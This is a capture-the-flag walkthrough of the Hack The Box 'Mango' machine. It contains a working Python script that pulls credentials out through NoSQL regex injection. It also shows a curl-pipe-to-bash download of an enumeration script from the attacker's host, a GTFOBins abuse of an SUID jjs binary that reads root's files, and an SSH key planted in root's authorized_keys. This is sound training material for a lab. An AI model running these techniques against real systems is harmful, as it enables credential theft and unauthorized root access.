---
layout: walkthrough
title: Mango
description: "HTB walkthrough"
logo: /assets/img/walkthroughs/mango_logo.png
show-avatar: false
permalink: /walkthroughs/mango.html
OS: Linux
difficulty: Medium 
release: 26 Oct 2019
creator: <a href="https://www.hackthebox.eu/home/users/profile/13531">MrR3boot</a>
cleared: 9 Nov 2019
published: 2019 11 09
---

<h2 align="center">Enumeration</h2>
Starting with a standard nmap scan...

```
# Nmap 7.80 scan initiated Fri Nov  1 13:43:18 2019 as: nmap -sC -sV -p- -oN nmapscan.txt 10.10.10.162
Nmap scan report for 10.10.10.162
Host is up (0.098s latency).
Not shown: 65532 closed ports
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)
|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)
|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)
80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: 403 Forbidden
443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Mango | Search Base
| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
| Not valid before: 2019-09-27T14:21:19
|_Not valid after:  2020-09-26T14:21:19
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Fri Nov  1 13:49:24 2019 -- 1 IP address (1 host up) scanned in 366.57 seconds

```

We see **ssh**, **http**, and **https** ports are open. Using our web browser to visit the site on port 80 we see we don't have permission. If we visit the https site (after accepting the certificate) we see

![Search](/assets/img/walkthroughs/mango_search.png)

of which the analytics link takes us to

![analytics](/assets/img/walkthroughs/mango_analytics.png)

which provides us with nothing more than a rabbit hole to go down. If you looked at the SSL cert instead of blindly accepting it (*cough*) you'll see there is another host name. 

![Cert](/assets/img/walkthroughs/mango_cert.png)

This was also visible in the nmap scan

```
ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN
```

If we edit that into our /etc/hosts file

```
root@kali:~/HTB/Boxes/Mango# cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.10.10.162    staging-order.mango.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters

```

and then visit that site with our browser on the standard port, we are greeted by a login page

![staging-order](/assets/img/walkthroughs/mango_staging-order.png)

Here is where the name for the box comes into play. Mango is supposed to make you think of MongoDB which is a popular web backend. MongoDB uses noSQL. By using Burp Suite and some information from this site

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection

We can test if this site is vulnerable to noSQL injection. 

![noSQL Test](/assets/img/walkthroughs/mango_nosqltest.png)

We have a successful login! Looking at the page we don't see much

![home page](/assets/img/walkthroughs/mango_underplantation.png)

other than there is an admin user. However now that we know the site is vulnerable to noSQL injection, we can get the usernames and passwords in the database.

<h3 align="center">Exploitation</h3>
Using the information from the PayloadsAllTheThings page, as well as this helpful blog post

https://blog.0daylabs.com/2016/09/05/mongo-db-password-extraction-mmactf-100/

I wrote the following python script....

```python
#!/usr/bin/env python3

import requests
import string

url = "http://staging-order.mango.htb/index.php"

def main():
	users = enum_users()

	if users:
		enum_passwords(users)
		print('Finished\n')
		for user in users:
			print('{}:{}'.format(user, users[user]))
	else:
		print('\nNo Users Found')

def enum_users():
	users = {}
	partial = {''}
	idle = ''

	while True:
		temp = set()
		for p in partial:
			flag = False
			for char in string.ascii_letters + string.digits:
				idle = print_idle(idle, 'Users')
				test = p + char
				post_data = {'username[$regex]': '^' + test, 'password[$gt]': '', 'login': 'login'}
				r = requests.post(url, data=post_data, allow_redirects=False)
				if r.status_code == 302:
					flag = True
					temp.add(test)
				if char == "9" and not flag:
					users[p] = ""
					print('\nFound User: ' + p)
		partial = temp.copy()
		if not temp:
			break

	return users

def enum_passwords(users):
	special = "~!@#$%^&*(){}[]<>?:"

	for user in users:
		length = get_pass_length(user)
		password = ""
		idle = ""
		for x in range(0, length):
			for char in string.ascii_letters + string.digits + special:
				if char in special:
					char = '\\' + char
				idle = print_idle(idle, 'Password for User \'{}\': {}'.format(user, password.replace('\\', "")))
				test = password + char
				post_data = {'username': user, 'password[$regex]': '^' + test, 'login': 'login'}
				r = requests.post(url, data=post_data, allow_redirects=False)
				if r.status_code == 302:
					password = test
					break
		users[user] = password.replace('\\', "")
		print('\n{}:{}'.format(user, users[user]))


def get_pass_length(user):
	length = 1
	while True:
		{% raw %}post_data = {'username': user, 'password[$regex]': '.{{{}}}'.format(length), 'login': 'login'}{% endraw %}
		r = requests.post(url, data=post_data, allow_redirects=False)
		if r.status_code == 302:
			length += 1
		else:
			return length - 1

def print_idle(idle, text):
	if (not len(idle)):
		idle = ' ' * 30	
	print('Enumerating {}{}'.format(text,idle), end='\r', flush=True)
	idle += '.'
	if (len(idle) < 8):
		return idle
	if (len(idle) == 8):
		return '        '
	if (len(idle) > 8):
		return '.'

if __name__ == '__main__':
    main()
```



and running it gives us the following users and passwords

mango:h3mXK8RhU~f{]f5H<br>
admin:t9KcS3>!0B#2

We'll find we can SSH in as user mango with those creds, however the user flag is in /home/admin, the admin password doesn't work for SSH, but it does work for su

```
root@kali:~/HTB/Boxes/Mango# ssh mango@10.10.10.162
mango@10.10.10.162's password:                                                           
<...>
Last login: Mon Nov 11 20:58:31 2019 from 10.10.14.7
mango@mango:~$ su admin
Password: 
$ whoami
admin
$ cd /home/admin
$ ls -la
total 24
drwxr-xr-x 2 admin admin 4096 Sep 30 03:20 .
drwxr-xr-x 4 root  root  4096 Sep 27 14:02 ..
lrwxrwxrwx 1 admin admin    9 Sep 27 14:30 .bash_history -> /dev/null
-rw-r--r-- 1 admin admin  220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 admin admin 3771 Apr  4  2018 .bashrc
-rw-r--r-- 1 admin admin  807 Apr  4  2018 .profile
-r-------- 1 admin admin   33 Sep 27 14:29 user.txt

```

<h3 align="center">On To Root</h3>
Running LinEnum we see that there is a binary we can run as admin that runs as root

```
admin@mango:/home/admin$ curl 10.10.14.7:8000/LinEnum.sh | bash
<...>
[-] SGID files:
<...>
-rwsr-sr-- 1 root admin 10352 Jul 18 18:21 /usr/lib/jvm/java-11-openjdk-amd64/bin/jjs
```

Using information from gtfobins

https://gtfobins.github.io/gtfobins/jjs/

we can execute the following commands to see the root flag

```
admin@mango:/home/admin$ jjs
Warning: The jjs tool is planned to be removed from a future JDK release
jjs> var BufferedReader = Java.type("java.io.BufferedReader");
jjs> var FileReader = Java.type("java.io.FileReader");
jjs> var br = new BufferedReader(new FileReader("/root/root.txt"));
jjs> while ((line = br.readLine()) != null) { print(line); };
8a8efXXXXXXXXXXXXXXXXXXXXXXXXXb15

```

If that's not good enough and you want to login as root. We can write our SSH public key into the authorized_keys by placing your SSH key into the following command

```
echo 'var FileWriter = Java.type("java.io.FileWriter");
var fw=new FileWriter("/root/.ssh/authorize_keys");
fw.write("ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDONWS4A2LUMDmjuCVdsibYEYzZPgVrF4MfdA/FbQatd85IDBIg2ewQxJaOsQerqmHZtnaZ+U1anDQ/C5Llv2jFMrW7iPBgq51qGsRD+GNRqNkciyagUMLc77NMLcm0SvlGfWrm+eoU6QQZM8ZuLDydW2njyGgvPR3+BO/D+k44knVGsOrjCmh8jv1xZc243Dl9DP2kMPb4TiIWg3eBANB3Z/hjvkA7E1spu9L2pImNUh9qd4tosI0UYO/XAuBWoQmH2gk3tVvsCynI48s2TQ64nVUTGAeGEaPC7yNEqm0th0tPU/RTiYtr6eaHmssLRpObjUzpw3rxX1LbPu6yi32TY5xixIqxcfLHCavA3n/Mi+iwmISrEQ3f1BA9fMY86UHwjZj7re38atOhaCKErtlC4JCrWyV2LA2b6Xmd6O2Vmh55YPsUbLFrTxzm8+CYjgOP5nF6AzGrXieJVzP4ldZRkbOUo/7K3M9C1ubOqMUiszNKWTUB78gk36jYPnRprxOHrHqeK/g1k2QW+HiuhHt6V6aLxcNaQkBss06Okid75QgsOwZWn68rNI+umWiXX4pitiJ7OIVFEUzSGnJvDrwkksuIfjK8S0K5L74+RpTCHYSnyxEX9WbaSKo37NvOyiKV4KPpwm3zSIk3nMToeqtVAKC90YMpVIDMQULvUYkG6Q==");
fw.close();' | jjs

```

and after executing it, we can then SSH in as root.

```
root@kali:~/HTB/Boxes/Mango# ssh root@10.10.10.162
<...>
Last login: Mon Nov 11 22:22:19 2019 from 10.10.14.7
root@mango:~# whoami
root
root@mango:~# id
uid=0(root) gid=0(root) groups=0(root)
root@mango:~# 

```